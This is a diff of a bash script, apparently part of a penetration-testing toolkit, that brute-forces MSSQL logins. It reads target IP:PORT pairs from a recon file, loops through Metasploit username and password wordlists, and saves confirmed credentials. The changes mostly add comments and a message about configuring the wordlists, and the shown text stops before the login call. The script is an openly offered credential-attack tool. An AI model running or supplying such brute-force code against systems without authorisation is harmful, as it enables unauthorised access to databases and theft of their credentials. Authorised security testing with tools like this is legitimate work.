@@ -1,14 +1,23 @@
 #!/usr/bin/env bash
 
-# Brute-forces MSSQL credentials using mssqlclient.
-# Reads IP:PORT pairs from recon/hosts/mssql-targets.txt.
-# Outputs confirmed credentials to recon/hosts/mssql-creds.txt.
+# 02_bruteforce — MSSQL Credential Brute-Force
+
+# Reads IP:PORT pairs from recon/hosts/mssql-targets.txt and attempts
+# authentication using wordlists for usernames and passwords.
+
+# Outputs confirmed credentials to recon/hosts/mssql-creds.txt
+# Format: IP:PORT:USERNAME:PASSWORD
 
 OUTDIR="./recon"
 TARGETS_FILE="$OUTDIR/hosts/mssql-targets.txt"
 CREDS_OUT="$OUTDIR/hosts/mssql-creds.txt"
+
+# CONFIGURABLE WORDLISTS -- Change these paths to use custom wordlists
+# for your specific engagement. Point them at any newline-delimited text file.
+
 USERS_FILE="/usr/share/wordlists/metasploit/common_users.txt"
 PASS_FILE="/usr/share/wordlists/metasploit/common_passwords.txt"
+
 
 if [[ ! -f "$TARGETS_FILE" ]]; then
     echo "[-] $TARGETS_FILE not found. Run 01_recon first."
@@ -26,6 +35,11 @@ fi
 echo "[*] Starting MSSQL brute-force against $(wc -l < "$TARGETS_FILE") target(s)"
 echo "[*] Users:     $USERS_FILE ($(wc -l < "$USERS_FILE") entries)"
 echo "[*] Passwords: $PASS_FILE ($(wc -l < "$PASS_FILE") entries)"
+echo ""
+echo "[ ! ] You can edit the wordlist file paths (USERS_FILE / PASS_FILE)"
+echo "      at the top of this script to use custom wordlists for your engagement."
+echo ""
+
 > "$CREDS_OUT"
 
 while IFS=: read -r TARGET_IP TARGET_PORT; do
@@ -35,7 +49,7 @@ while IFS=: read -r TARGET_IP TARGET_PORT; do
     while read -r USER; do
         [[ $FOUND -eq 1 ]] && break
         while read -r PASS; do
-            # Skip any of the blank lines
+            # Skip blank lines
             [[ -z "$USER" || -z "$PASS" ]] && continue
 
             RESULT=$(printf 'exit\n' | \
